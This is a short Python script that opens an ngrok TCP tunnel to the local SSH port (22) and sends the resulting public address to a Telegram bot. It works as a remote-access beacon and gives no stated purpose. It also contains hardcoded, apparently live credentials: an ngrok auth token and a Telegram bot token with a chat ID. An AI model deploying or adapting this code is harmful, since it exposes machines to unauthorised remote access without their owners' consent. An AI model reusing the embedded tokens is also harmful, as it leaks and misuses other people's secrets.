import asyncio
import json
import urllib.request
import os
import sys

os.environ.setdefault("NG_TOKEN", "2JVsjpRofJqsvf4mjWKFO887FTy_uXY5Qc4RoQfW3X78aP4R")

ngrokpath ="ngrok.exe"
ng_token = os.environ.get('NG_TOKEN')

async def main():
	p = await asyncio.subprocess.create_subprocess_exec(
		ngrokpath, 'authtoken', ng_token,
		stdout=asyncio.subprocess.PIPE,
		stderr=asyncio.subprocess.STDOUT
	)
	await p.wait()
	p = await asyncio.subprocess.create_subprocess_exec(
		ngrokpath, 'tcp', '22', '--log', 'stdout', '--log-format', 'json',
		stdout=asyncio.subprocess.PIPE,
		stderr=asyncio.subprocess.STDOUT
	)
	while p.returncode is None:
		line = await p.stdout.readline()
		if line != b'':
			line = line.decode()
			json_ = json.loads(line)
			dict_ = dict(json_)
			url = dict_.get('url', None)
		if url:
			urllib.request.urlopen(f"https://api.telegram.org/bot5853498488:AAGa6b6gQ9ebSo4x1kgMl7_OmCh4x1Mo26o/sendMessage?chat_id=5547761832&text={url}")
			print(url)
			break

if __name__ == '__main__':
	if sys.platform == "win32":
		asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
	asyncio.run(main())
